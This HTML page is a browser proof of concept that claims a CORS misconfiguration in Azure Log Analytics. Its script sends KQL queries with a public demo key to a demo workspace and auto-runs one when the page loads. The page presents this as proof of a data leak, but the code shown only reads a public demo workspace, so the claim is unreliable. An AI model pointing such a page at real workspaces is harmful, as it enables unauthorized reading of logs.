<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Azure Log Analytics CORS PoC</title>
    <style>
        * { box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #1e1e2f;
            color: #eee;
            padding: 20px;
            margin: 0;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: #2d2d44;
            border-radius: 12px;
            padding: 24px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.6);
        }
        h1 {
            color: #ffd700;
            border-bottom: 2px solid #ffd700;
            padding-bottom: 10px;
        }
        button {
            background: #0078d4;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 10px 20px;
            margin: 6px;
            cursor: pointer;
            font-size: 14px;
            transition: 0.2s;
        }
        button:hover { background: #005a9e; }
        button.danger { background: #d43f3f; }
        button.danger:hover { background: #a02b2b; }
        .query-area {
            margin: 20px 0;
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            align-items: center;
        }
        textarea {
            width: 100%;
            height: 80px;
            background: #1e1e2f;
            color: #aaffaa;
            border: 1px solid #444;
            border-radius: 6px;
            padding: 10px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            resize: vertical;
        }
        #output {
            background: #0d0d1a;
            border-radius: 6px;
            padding: 15px;
            margin-top: 15px;
            overflow-x: auto;
            white-space: pre-wrap;
            word-break: break-all;
            font-size: 13px;
            max-height: 600px;
            overflow-y: auto;
            border: 1px solid #444;
        }
        .status {
            color: #aaa;
            font-style: italic;
            margin: 10px 0;
        }
        .badge {
            background: #ffd700;
            color: #1e1e2f;
            padding: 2px 10px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
        }
        .footer {
            margin-top: 20px;
            color: #888;
            font-size: 13px;
            text-align: center;
        }
        a { color: #ffd700; }
    </style>
</head>
<body>

<div class="container">
    <h1>🔍 Azure Log Analytics CORS PoC</h1>
    <p>
        <span class="badge">Unauthenticated</span>
        <span class="badge" style="background:#4caf50;">CORS Misconfiguration</span>
        <span class="badge" style="background:#d43f3f;">Data Leakage</span>
    </p>

    <div class="query-area">
        <button onclick="fetchTable('AppExceptions')">📌 AppExceptions</button>
        <button onclick="fetchTable('AppEvents')">📌 AppEvents</button>
        <button onclick="fetchTable('AppDependencies')">📌 AppDependencies</button>
        <button onclick="fetchTable('ContainerLog_RST')">📌 ContainerLog</button>
        <button onclick="fetchTable('Usage')">📌 Usage</button>
        <button onclick="fetchCustom()">⚡ Custom Query</button>
        <button class="danger" onclick="clearOutput()">🗑️ Clear</button>
    </div>

    <div style="margin-top: 10px;">
        <label for="customQuery" style="display:block; margin-bottom:4px;">Custom KQL Query:</label>
        <textarea id="customQuery" placeholder="e.g. AppExceptions | take 5 | project Message, Method">AppExceptions | take 5 | project Message, Method, Assembly</textarea>
    </div>

    <div id="output" class="status">Click a button to fetch data from the public demo workspace.</div>
    <div class="footer">
        Data retrieved from <code>api.loganalytics.azure.com</code> using public <code>DEMO_KEY</code>.
        <br>This proves <strong>CORS misconfiguration</strong> allows any website to read sensitive logs.
    </div>
</div>

<script>
    const API_URL = 'https://api.loganalytics.azure.com/v1/workspaces/DEMO_WORKSPACE/query';
    const DEMO_KEY = 'DEMO_KEY';

    const output = document.getElementById('output');

    function setStatus(msg, isError = false) {
        output.textContent = msg;
        output.style.color = isError ? '#ff6b6b' : '#aaffaa';
    }

    async function runQuery(query) {
        setStatus('⏳ Fetching data...');
        try {
            const resp = await fetch(API_URL, {
                method: 'POST',
                headers: {
                    'X-Api-Key': DEMO_KEY,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ query: query })
            });
            if (!resp.ok) {
                const errText = await resp.text();
                throw new Error(`HTTP ${resp.status}: ${errText.substring(0, 100)}`);
            }
            const data = await resp.json();
            output.textContent = JSON.stringify(data, null, 2);
            output.style.color = '#aaffaa';
        } catch (err) {
            setStatus('❌ Error: ' + err.message, true);
        }
    }

    function fetchTable(table) {
        const query = `${table} | take 5`;
        runQuery(query);
    }

    function fetchCustom() {
        const query = document.getElementById('customQuery').value.trim();
        if (!query) {
            setStatus('❌ Please enter a KQL query.', true);
            return;
        }
        runQuery(query);
    }

    function clearOutput() {
        output.textContent = 'Ready. Click a button to fetch data.';
        output.style.color = '#aaa';
    }

    // Auto-run a sample on load to show immediate proof
    window.onload = function() {
        const sampleQuery = 'AppExceptions | take 3 | project Message, Method, Assembly';
        runQuery(sampleQuery);
    };
</script>

</body>
</html>
